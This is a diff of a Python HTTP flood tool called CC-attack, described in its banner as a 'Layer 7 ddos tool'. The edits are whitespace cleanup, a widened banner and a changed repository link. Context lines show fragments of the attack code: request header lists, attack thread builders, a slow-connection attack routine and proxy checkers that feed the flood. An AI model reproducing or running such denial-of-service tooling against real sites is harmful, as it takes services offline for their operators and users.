@@ -20,23 +20,23 @@ import os
 print ('''
 	   /////    /////    /////////////
 	  CCCCC/   CCCCC/   | CC-attack |/
-	 CC/      CC/       |-----------|/ 
-	 CC/      CC/       |  Layer 7  |/ 
-	 CC/////  CC/////   | ddos tool |/ 
+	 CC/      CC/       |-----------|/
+	 CC/      CC/       |  Layer 7  |/
+	 CC/////  CC/////   | ddos tool |/
 	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
 Version 3.7.1 (2022/3/24)
                               C0d3d by L330n123
-┌─────────────────────────────────────────────┐
-│        Tos: Don't attack .gov website       │
-├─────────────────────────────────────────────┤
-│                 New stuff:                  │
-│          [+] Added Http Proxy Support       │
-│          [+] Optimization                   │
-│          [+] Changed Varible Name           │
-├─────────────────────────────────────────────┤
-│ Link: https://github.com/Leeon123/CC-attack │
-└─────────────────────────────────────────────┘''')
+┌──────────────────────────────────────────────┐
+│        Tos: Don't attack .gov website        │
+├──────────────────────────────────────────────┤
+│                 New stuff:                   │
+│          [+] Added Http Proxy Support        │
+│          [+] Optimization                    │
+│          [+] Changed Varible Name            │
+├──────────────────────────────────────────────┤
+│ Link: https://github.com/eymeen/CC-attack-js │
+└──────────────────────────────────────────────┘''')
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -113,7 +113,7 @@ def build_threads(mode,thread_num,event,proxy_type):
 			th = threading.Thread(target = head,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
-			
+
 
 def getuseragent():
 	platform = Choice(['Macintosh', 'Windows', 'X11'])
@@ -391,8 +391,8 @@ def slow(conn,proxy_type):
 				threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
 		else:
 			time.sleep(0.1)
-'''		
-		
+'''
+
 nums = 0
 def checking(lines,proxy_type,ms,rlock,):#Proxy checker coded by Leeon123
 	global nums
@@ -463,7 +463,7 @@ def check_socks(ms):#Coded by Leeon123
 			fp.write(bytes(lines,encoding='utf8'))
 		fp.close()
 	print("> They are saved in "+out_file)
-			
+
 def check_list(socks_file):
 	print("> Checking list")
 	temp = open(socks_file).readlines()
@@ -713,9 +713,9 @@ def main():
 	if os.path.exists(out_file)!=True:
 		print("Proxies file not found")
 		return
-	proxies = open(out_file).readlines()	
+	proxies = open(out_file).readlines()
 	check_list(out_file)
-	proxies = open(out_file).readlines()	
+	proxies = open(out_file).readlines()
 	if len(proxies) == 0:
 		print("> There are no more proxies. Please download a new proxies list.")
 		return
@@ -724,7 +724,7 @@ def main():
 		check_socks(3)
 
 	proxies = open(out_file).readlines()
-	
+
 	if help:
 		PrintHelp()
 
